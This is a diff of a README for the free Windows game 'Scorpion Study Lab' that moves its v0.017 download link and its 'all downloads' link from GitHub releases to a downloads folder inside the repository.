@@ -4,9 +4,9 @@
 
 **A living scorpion terrarium you watch rather than control.** Free Windows early build by [Oddsprig](https://oddsprig.com/scorpion-study-lab/).
 
-### [⬇ Download v0.017 for Windows (free, 76 MB)](https://github.com/douglasfpowell2020-a11y/scorpion-study-lab/releases/latest/download/ScorpionStudyLab-v0.017-windows.zip)
+### [⬇ Download v0.017 for Windows (free, 76 MB)](https://github.com/douglasfpowell2020-a11y/scorpion-study-lab/raw/main/downloads/ScorpionStudyLab-v0.017-windows.zip)
 
-Game page: **[oddsprig.com/scorpion-study-lab](https://oddsprig.com/scorpion-study-lab/)** · All releases: [Releases](https://github.com/douglasfpowell2020-a11y/scorpion-study-lab/releases)
+Game page: **[oddsprig.com/scorpion-study-lab](https://oddsprig.com/scorpion-study-lab/)** · All downloads: [downloads/](downloads/)
 
 ![Watch life follows a scorpion hunting beside her stone](media/shot-windows.jpg)
 
